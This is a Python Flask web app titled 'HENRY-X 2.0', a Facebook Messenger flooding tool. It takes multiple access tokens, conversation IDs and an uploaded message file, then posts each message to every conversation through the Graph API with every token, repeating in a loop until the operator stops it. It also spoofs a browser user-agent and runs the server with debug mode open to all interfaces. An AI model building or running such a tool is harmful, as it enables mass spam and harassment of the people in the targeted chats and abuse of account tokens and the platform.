from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import os
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_ids, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                for thread_id in thread_ids:
                    api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    print(f"{'✅' if response.status_code == 200 else '❌'} Token: {access_token[:10]}... UID: {thread_id} => {message}")
                    time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def index():
    message = ""
    if request.method == 'POST':
        if 'stopTask' in request.form:
            task_id = request.form.get('stopTask')
            if task_id in stop_events:
                stop_events[task_id].set()
                message = f'<p style="color:red;text-align:center;">🛑 Task {task_id} stopped.</p>'
            else:
                message = f'<p style="color:red;text-align:center;">❌ Invalid Task ID.</p>'
        else:
            token_count = int(request.form.get('tokenCount'))
            uid_count = int(request.form.get('uidCount'))
            access_tokens = [request.form.get(f'token{i}') for i in range(token_count)]
            thread_ids = [request.form.get(f'uid{i}') for i in range(uid_count)]

            mn = request.form.get('header')
            time_interval = int(request.form.get('delay'))
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_ids, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()

            message = f'<p style="color:red;text-align:center;">✅ Task started with ID: <b>{task_id}</b></p>'

    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>HENRY-X 2.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: linear-gradient(to right, #9932CC, #FF00FF);
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .box {
            width: 100%;
            max-width: 100%;
            border: 2px solid red;
            background: transparent;
            padding: 25px;
            border-radius: 20px;
            margin-bottom: 30px;
            box-shadow: 0 0 20px red;
        }
        label {
            display: block;
            margin-top: 15px;
            font-weight: bold;
        }
        input[type="text"], input[type="number"], input[type="file"] {
            width: 100%;
            padding: 12px;
            margin-top: 5px;
            border-radius: 10px;
            border: 1px solid red;
            background: black;
            color: white;
        }
        button {
            background: #7B68EE;
            border: none;
            color: white;
            justify-content: center;
            padding: 12px 20px;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
            font-size: 16px;
        }
        h2 {
            text-align: center;
            color: red;
            justify-content: center;
            font-size: 22px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <div class="box">
        <h2>2.0</h2>
        {{ message|safe }}
        <form method="POST" enctype="multipart/form-data">
            <label>How many tokens?</label>
            <input type="number" name="tokenCount" id="tokenCount" value="1" required oninput="generateTokenInputs()">
            <div id="tokenInputs"></div>

            <label>How many Convo UIDs?</label>
            <input type="number" name="uidCount" id="uidCount" value="1" required oninput="generateUIDInputs()">
            <div id="uidInputs"></div>

            <label>Header Name</label>
            <input type="text" name="header" required>

            <label>Delay (seconds)</label>
            <input type="number" name="delay" value="2" required>

            <label>Upload Message File (.txt)</label>
            <input type="file" name="txtFile" required>

            <button type="submit">START</button>
        </form>
    </div>

    <div class="box">
        <h2>STOPED</h2>
        <form method="POST">
            <label>Enter Task ID to Stop</label>
            <input type="text" name="stopTask" placeholder="Paste Task ID here..." required>
            <button type="submit">STOPED</button>
        </form>
    </div>
  </div>
          <!-- Add this just before </body> -->
  <footer style="text-align:center; color: #888; margin-top: 40px; font-size: 14px;">
      © 2025 HENRY-X. All Rights Reserved<br>
      Made with by Henry
  </footer>
 
    <script>
        function generateTokenInputs() {
            const count = parseInt(document.getElementById('tokenCount').value);
            const container = document.getElementById('tokenInputs');
            container.innerHTML = '';
            for (let i = 0; i < count; i++) {
                container.innerHTML += `<label>Token ${i+1}</label><input type="text" name="token${i}" required>`;
            }
        }

        function generateUIDInputs() {
            const count = parseInt(document.getElementById('uidCount').value);
            const container = document.getElementById('uidInputs');
            container.innerHTML = '';
            for (let i = 0; i < count; i++) {
                container.innerHTML += `<label>Convo UID ${i+1}</label><input type="text" name="uid${i}" required>`;
            }
        }

        window.onload = () => {
            generateTokenInputs();
            generateUIDInputs();
        };
    </script>
</body>
</html>
''', message=message)
    
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
